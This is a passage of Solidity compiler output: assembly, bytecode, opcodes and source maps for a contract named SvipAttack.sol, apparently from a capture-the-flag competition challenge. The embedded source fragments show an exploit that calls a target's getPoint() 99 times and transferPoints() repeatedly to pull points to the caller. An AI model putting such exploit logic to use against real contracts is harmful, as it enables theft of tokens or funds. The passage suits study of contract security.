jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_15:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":224:237  sv.getPoint() */\n      pop\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":205:208  i++ */\n      dup1\n      dup1\n      0x1\n      add\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":186:249  for(uint i =0;i<99;i++){\r... */\n      jump(tag_11)\n    tag_12:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":155:256  function get()public{\r... */\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":262:434  function transfer()public{\r... */\n    tag_9:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":302:308  uint i */\n      0x0\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":309:310  0 */\n      dup1\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":302:310  uint i=0 */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":298:382  for(uint i=0;i<11;i++){\r... */\n    tag_17:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":313:315  11 */\n      0xb\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":311:312  i */\n      dup2\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":311:315  i<11 */\n      lt\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":298:382  for(uint i=0;i<11;i++){\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":335:337  sv */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":335:352  sv.transferPoints */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x326f823f\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":361:365  this */\n      address\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":367:369  98 */\n      0x62\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":335:370  sv.transferPoints(address(this),98) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_20:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":335:370  sv.transferPoints(address(this),98) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":335:370  sv.transferPoints(address(this),98) */\n      pop\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":316:319  i++ */\n      dup1\n      dup1\n      0x1\n      add\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":298:382  for(uint i=0;i<11;i++){\r... */\n      jump(tag_17)\n    tag_18:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":392:394  sv */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":392:409  sv.transferPoints */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x326f823f\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":410:420  msg.sender */\n      caller\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":421:425  1000 */\n      0x3e8\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":392:426  sv.transferPoints(msg.sender,1000) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":392:426  sv.transferPoints(msg.sender,1000) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_23:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":392:426  sv.transferPoints(msg.sender,1000) */\n      pop\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":262:434  function transfer()public{\r... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820ed92e7a76ceed5a71f5659588d73f4884c3d4df6bd931e4fc3ea7b5c366aeb320029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516020806103c483398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610341806100836000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c146100515780638a4068dd14610068575b600080fd5b34801561005d57600080fd5b5061006661007f565b005b34801561007457600080fd5b5061007d61013b565b005b60008090505b6063811015610138576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bea9faa6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050508080600101915050610085565b50565b60008090505b600b811015610234576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663326f823f3060626040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561020f57600080fd5b505af1158015610223573d6000803e3d6000fd5b505050508080600101915050610141565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663326f823f336103e86040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b1580156102fa57600080fd5b505af115801561030e573d6000803e3d6000fd5b50505050505600a165627a7a72305820ed92e7a76ceed5a71f5659588d73f4884c3d4df6bd931e4fc3ea7b5c366aeb320029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x3C4 DUP4 CODECOPY DUP2 ADD DUP1 PUSH1 0x40 MSTORE DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x341 DUP1 PUSH2 0x83 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6D4CE63C EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x8A4068DD EQ PUSH2 0x68 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0x7F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x74 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7D PUSH2 0x13B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST PUSH1 0x63 DUP2 LT ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x5BEA9FAA PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x113 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x127 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x85 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST PUSH1 0xB DUP2 LT ISZERO PUSH2 0x234 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x326F823F ADDRESS PUSH1 0x62 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x223 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x141 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x326F823F CALLER PUSH2 0x3E8 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2FA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x30E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xed SWAP3 0xe7 0xa7 PUSH13 0xEED5A71F5659588D73F4884C3D 0x4d 0xf6 0xbd SWAP4 0x1e 0x4f 0xc3 0xea PUSH28 0x5C366AEB320029000000000000000000000000000000000000000000 ",
							"sourceMap": "48:389:1:-;;;88:61;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:61:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;135:5;125:2;;:16;;;;;;;;;;;;;;;;;;88:61;48:389;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c146100515780638a4068dd14610068575b600080fd5b34801561005d57600080fd5b5061006661007f565b005b34801561007457600080fd5b5061007d61013b565b005b60008090505b6063811015610138576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bea9faa6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050508080600101915050610085565b50565b60008090505b600b811015610234576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663326f823f3060626040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561020f57600080fd5b505af1158015610223573d6000803e3d6000fd5b505050508080600101915050610141565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663326f823f336103e86040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b1580156102fa57600080fd5b505af115801561030e573d6000803e3d6000fd5b50505050505600a165627a7a72305820ed92e7a76ceed5a71f5659588d73f4884c3d4df6bd931e4fc3ea7b5c366aeb320029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6D4CE63C EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x8A4068DD EQ PUSH2 0x68 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0x7F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x74 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7D PUSH2 0x13B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST PUSH1 0x63 DUP2 LT ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x5BEA9FAA PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x113 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x127 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x85 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST PUSH1 0xB DUP2 LT ISZERO PUSH2 0x234 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x326F823F ADDRESS PUSH1 0x62 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x223 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x141 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x326F823F CALLER PUSH2 0x3E8 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2FA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x30E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xed SWAP3 0xe7 0xa7 PUSH13 0xEED5A71F5659588D73F4884C3D 0x4d 0xf6 0xbd SWAP4 0x1e 0x4f 0xc3 0xea PUSH28 0x5C366AEB320029000000000000000000000000000000000000000000 ",
							"sourceMap": "48:389:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;155:101;;8:9:-1;5:2;;;30:1;27;20:12;5:2;155:101:1;;;;;;262:172;;8:9:-1;5:2;;;30:1;27;20:12;5:2;262:172:1;;;;;;155:101;190:6;198:1;190:9;;186:63;202:2;200:1;:4;186:63;;;224:2;;;;;;;;;;;:11;;;:13;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;224:13:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;224:13:1;;;;205:3;;;;;;;186:63;;;155:101;:::o;262:172::-;302:6;309:1;302:8;;298:84;313:2;311:1;:4;298:84;;;335:2;;;;;;;;;;;:17;;;361:4;367:2;335:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;335:35:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;335:35:1;;;;316:3;;;;;;;298:84;;;392:2;;;;;;;;;;;:17;;;410:10;421:4;392:34;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;392:34:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;392:34:1;;;;262:172;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "166600",
								"executionCost": "20567",
								"totalCost": "187167"
							},
							"external": {
								"get()": "infinite",
								"transfer()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "MSTORE"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "POP"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "MLOAD"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "PUSHSIZE"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP4"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "CODECOPY"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP2"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "ADD"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "MSTORE"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP2"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "ADD"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "DUP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "MLOAD"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "ADD"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP3"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP2"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "SWAP1"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "POP"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "POP"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "POP"
								},
								{
									"begin": 135,
									"end": 140,
									"name": "DUP1"
								},
								{
									"begin": 125,
									"end": 127,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 125,
									"end": 127,
									"name": "DUP1"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "EXP"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "DUP2"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "SLOAD"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "DUP2"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "MUL"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "NOT"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "AND"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "SWAP1"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "DUP4"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "AND"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "MUL"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "OR"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "SWAP1"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "SSTORE"
								},
								{
									"begin": 125,
									"end": 141,
									"name": "POP"
								},
								{
									"begin": 88,
									"end": 149,
									"name": "POP"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "DUP1"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "CODECOPY"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "PUSH",
